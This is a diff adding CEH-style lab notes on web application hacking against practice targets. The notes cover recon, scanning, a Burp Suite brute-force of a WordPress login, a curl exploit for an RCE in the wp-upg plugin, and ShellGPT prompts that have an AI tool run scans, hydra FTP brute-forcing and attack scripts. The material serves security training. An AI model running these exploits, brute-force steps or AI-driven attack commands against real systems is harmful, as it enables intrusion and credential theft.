@@ -2091,3 +2091,228 @@ It’s basically a wrapper around the OpenAI API.
   - The mirrored certifiedhacker.com website opens up in Firefox browser
 </details>
 
+# Hacking Web Applications
+<details>
+<summary>Footprint the Web Infrastructure</summary>
+
+* Perform Web Application Reconnaissance using Nmap and Telnet :~
+  - Use tools such as:
+    - Netcraft - https://www.netcraft.com 
+    - SmartWhois - https://www.tamos.com)
+    - WHOIS Lookup - https://whois.domaintools.com
+    - Batch IP Converter - http://www.sabsoft.com
+  - Perform DNS Interrogation:
+    - DNSRecon - https://github.com
+    - Domain Dossier - https://centralops.net  
+  - we will perform port scanning to gather information
+  - open parrot security and type sudo su for root user and type cd for root directory
+    ```console
+          nmap -T4 -A -v [Target Web Application]
+    ```
+    - -T4 = for fast and aggressive respose
+    - -A = Aggressive
+    - -v = verbose
+    - target web application = www.moviescope.com
+  - You can observe that the target machine name, NetBIOS name, DNS name, MAC address, OS, and other information is displayed
+  - perform banner grabbing to identify the make, model, and version of the target web server software
+    ```console
+          telnet www.moviescope.com 80
+    ```
+    - The Trying 10.10.1.19… message appears; type
+      - GET / HTTP/1.0 (after this press enter 2 times)
+  - the server is identified as Microsoft-IIS/10.0 and the technology used is ASP.NET
+  - This concludes the demonstration of how to perform web application reconnaissance (Whois lookup, DNS interrogation, port and services discovery, banner grabbing, and firewall detection)
+
+* Perform Web Spidering using OWASP ZAP :~
+  - open parrot machine adn type sudo su for root user amd type cd for root directory
+  - open QWASP ZAP we have to type 
+    - zaproxy
+  - After completing initialization, a prompt that reads Do you want to persist the ZAP Session? appears; select the No, I do not want to persist this session at this moment in time radio button and click Start
+  - click Automated Scan
+  - under the URL to attack field (here, www.moviescope.com). Leave the other settings to default and click the Attack button
+  - click siper tab and After performing web spidering, OWASP ZAP performs active scanning. Navigate to the Active Scan tab to observe the various scanned links
+  - check all spider tab and message tab and other tabs 
+
+* Perform Web Application Vulnerability Scanning using SmartScanner :~
+  - open windows 11 mechine and search smartscanner and launch smart scanner
+  - In the enter site address to scan field, enter www.moviescope.com and click enter for scan
+  - Once the tool completes scanning, it will display the issues that are found under Found Issues section and Severity of Issues
+  - expand Password Sent Over HTTP and click on first http://www.moviescope.com
+  - check the description, reccommandation, refference and you can check CWE also
+  - CWE website appears in Microsoft Edge web browser, displaying the details of CWE-319 ClearText Transmission of Sensitive Information
+  - you check all in issue section and check vulnerability and sensitive data also
+  - You can also use other web application vulnerability scanning tools such as
+    - WPScan Vulnerability Database - https://wpscan.com
+    - Codename SCNR - https://ecsypno.co
+    - AppSpider - https://www.rapid7.com
+    - Uniscan - https://github.com
+    - N-Stalker - https://www.nstalker.com                         
+</details>
+
+<details>
+<summary>Perform Web Application Attacks</summary>
+
+* Perform a Brute-force Attack using Burp Suite :~
+  - In this task, the target WordPress website (http://10.10.1.22:8080/CEH) is hosted by the victim machine, Windows Server 2022. Here, the host machine is the Parrot Security machine
+  - Wampserver is running in Windows Server 2022 machine. To run the WampServer
+  - open windows sever 2022 and launch the wampserver and it will notifiy as green after the launch
+  - go to the parrot machine
+  - Launch the Mozilla Firefox web browser and go to
+    ```console
+          http://10.10.1.22:8080/CEH/wp-login.php?.
+    ```
+  - we shall set up a Burp Suite proxy by first configuring the proxy settings of the browser
+  - in mozila firefox set the proxy and HTTP Proxy as 127.0.0.1 and the Port as 8080. Tick the Also use this proxy for HTTPS checkbox
+  - open the burpsuit and open the temperory project and start burpsuit as default
+  - in the proxy tab the intercept is active whether it was off please turn it on
+  - go back to the browser page in word press website type random credentials as admin and password and click login 
+  - in burpsuite HTTP request was intercepted by the application
+  - right click anywhere and click Send to Intruder
+  - click on the Intruder tab from the toolbar and observe that under the Intruder tab, the Positions tab appears by default
+  - In the Positions tab under the Intruder tab observe that Burp Suite sets the target positions by default, as shown in the HTTP request. Click the Clear § button from the right-pane to clear the default payload values
+  - select Cluster bomb from the Attack type
+  - Now, we will set the username and password as the payload values
+  - select the username value entered in Step#14 and click Add § from the right-pane. Similarly, select the password value entered in Step#14 and click Add § from the right-pane
+  - Navigate to the Payloads tab under the Intruder tab and ensure that under the Payload Sets section, the Payload set is selected as 1, and the Payload type is selected as Simple list
+  - Under the Payload settings [Simple list] section, click the Load… button
+  - and select the username.txt inside the wordlist folder
+  - next step is set the payload set is select as 2 and payload type is simple list
+  - click load option and select the password.txt file 
+  - click start attack
+  -  Intruder attack of 10.10.1.22 window appears as the brute-attack initializes
+  - scroll down and observe the different values of Status and Length. Here, Status=302 and Length= 1155
+  - Raw tab under the Request tab, the HTTP request with a set of the correct credentials is displayed. (here, username=admin and password=qwerty@123)
+  - Now, that you have obtained the correct user credentials, close the Intruder attack of 10.10.1.22 window
+  - Navigate back to the Proxy tab and click the Intercept is on button to turn off the interception. The Intercept is on button toggles to Intercept is off
+  - open firfox and open setting and proxy section and turn of that section select the no proxy and close
+  - Reload the target website http://10.10.1.22:8080/CEH/wp-login.php?, enter the Username and Password that is admin and qwerty@123 and click login
+  - you are successfull logged in the wordpress website
+  this is the demonstration of this lab
+
+* Perform Remote Code Execution (RCE) Attack :~
+  - switch to the Windows Server 2022 and open the wampserver 64
+  - Wait for this icon to turn green, which indicates that the WampServer is successfully running
+  - open web browser and go to 
+    ```console
+          http://10.10.1.22:8080/CEH/wp-login.php?
+    ```
+  - wordpress page will appears and Type Username or Email Address and Password as admin and qwerty@123. Click the Log In
+  - Hover your mouse cursor on Plugins in the left pane and click Installed Plugins
+  - In the Plugins page, observe that User Post Gallery is installed. Click Activate under the User Post Gallery
+  - switch to the Parrot Security machine
+  - Open Mozilla Firefox web browser and go to https://wpscan.com/ and login to the wpscan account
+  - Get Started button and click Start for free button under Researcher section
+  - Edit Profile page appears; in the API Token section and observe the API Token. Note down or copy this API Token
+  - close the firefox window and open terminal and enter sudo su and cd for root directory
+  - run the command
+    ```console
+          wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token what we copied]
+    ```
+  - Scroll down to the Plugin(s) Identified section, and observe the installed vulnerable plugins (wp-upg) on the target website
+  - In the Plugin(s) Identified section, within the context of the wp-upg plugin, an Unauthenticated Remote Code Execution (RCE) vulnerability
+  - In this task, we will exploit the RCE vulnerability present in the wp-upg plugin
+  - to perform RCE run command
+    ```console
+          curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'
+    ```
+  - This curl command exploits a WordPress plugin vulnerability by sending a malicious request to the admin-ajax.php file
+  - whoami command was executed, yielding the outcome nt authority\ \system
+  - This concludes the demonstration of performing RCE attack                                 
+</details>
+
+<details>
+<summary>Detect Web Application Vulnerabilities using Various Web Application Security Tools</summary>
+
+* Detect Web Application Vulnerabilities using Wapiti Web Application Security Scanner :~
+  - switch to the Parrot Security machine. Open a Terminal window and execute sudo su for root user
+  - in terminal window and type cd wapiti
+  - type python3 -m venv wapiti3 to create virtual environment in python
+  - run command for activate the virtual environment
+    ```console
+          . wapiti3/bin/activate
+    ```
+  - run this command to install wapiti web application security scanner 
+  - pip install .
+  - run command for wapiti web application security scanner
+    ```console
+          wapiti -u https://www.certifiedhacker.com
+    ```
+  - run this command to navigate generate_report directory
+    ```console
+          cd /root/.wapiti/generated_report/
+    ```
+  - Run ls command to view the contents of the directory we can see that the certifiedhacker.com_xxxxxxxx_xxxx.html file is created
+  - run command to copy this file to /home/attacker/
+    ```console
+          cp certifiedhacker.com_xxxxxxxx_xxxx.html /home/attacker/ 
+    ```
+  - Open a new terminal and run firefox certifiedhacker.com_xxxxxxxx_xxxx.html command to open the .html file in Firefox browser
+  - Wapiti scan report opens upp in Firefox browser, you can analyze the scan result with the discovered vulnerabilities                                       
+</details>
+
+<details>
+<summary>Perform Web Application Hacking using AI</summary>
+
+* Perform Web Application Hacking using ShellGPT :~
+  - open parrot security and open the terminal and type sudo su
+  - open sgpt usimg command
+    - bash sgpt.sh
+  - use the activation key
+  - run this command for detect the WAF 
+    ```console
+          sgpt --shell "Check if the target url www.certifiedhacker.com has web application firewall" 
+    ```
+  - run thos command for detect the WAF using wafwoof
+    ```console
+          sgpt --shell "Check if the target url https://www.certifiedhacker.com is protected with web application firewall using wafwoof"
+    ```              
+  - to detect the load balancer use this command
+    ```command
+          sgpt --shell "Use load balancing detector on target domain yahoo.com."
+    ```
+  - run this command for To identify server side technologies
+    ```console
+          sgpt --chat HWA --shell "Launch whatweb on the target website www.moviescope.com to perform website footprinting. Run a verbose scan and print the output. Save the results in file whatweb_log.txt." 
+    ```
+  - To view the generated whatweb_log.txt file contents, navigate to /home/attacker and double-click on whatweb_log.txt file
+  - run this command command to identify web application vulnerabilities on a target website
+    ```console
+          sgpt --shell "Perform the Vulnerability scan on the target url www.moviescope.com"
+    ```
+  - run this command to perform web application scanning using Nmap
+    ```console
+          gpt --shell "Perform the Vulnerability scan on the target url www.moviescope.com using nmap"
+    ```
+  - To perform a vulnerability scan on web application using Sniper tool run
+    ```console
+          sgpt --shell "Use Sn1per tool and scan the target url www.moviescope.com for web vulnerabilities and save result in file scan3.txt"
+    ```
+  - To identify files of a web application run
+    ```console
+          sgpt --shell "Scan the web content of target url www.moviescope.com using Dirb"
+    ```
+  - run this command to identify directories using Gobuster
+    ```console
+          sgpt --shell "Scan the web content of target url www.moviescope.com using Gobuster"
+    ```
+  - To perform FTP bruteforce attack run 
+    ```console
+          sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"
+    ```
+  - run this command to to automate web application hacking tasks with custom scripts
+    ```console
+          sgpt --chat wah --shell "create and run a custom script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com"
+    ```
+  - To create a custom python script for web application scanning run 
+    ```console
+          sgpt --chat wah --shell "create and run a custom python script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com"
+    ```
+  - To create a custom python script for web application scanning run 
+    ```console
+          sgpt --chat wah --shell "create and run a custom python script which will run web application footprinting tasks to gather information and then use this information to perform vulnerability scanning on target url is www.certifiedhacker.com"
+    ```
+  - To perform Web application fuzz testing using ShellGPT run 
+    ```console
+          sgpt --shell "Fuzz the target url www.moviescope.com using Wfuzz tool"
+    ```                                                                                                 
+</details>
